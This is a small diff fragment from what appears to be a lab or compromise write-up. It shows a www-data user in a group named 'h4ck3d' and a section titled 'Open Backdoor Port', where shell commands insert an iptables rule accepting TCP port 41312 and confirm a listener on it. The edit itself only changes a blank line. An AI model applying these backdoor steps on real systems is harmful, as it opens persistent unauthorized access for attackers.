@@ -164,7 +164,7 @@ Content-Type: text/html
 uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
 
 <h3> Open Backdoor Port </h3>
-  
+---  
 jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
 jack@ubuntu:/opt$ ss -tlnup | grep "41312"
 tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        
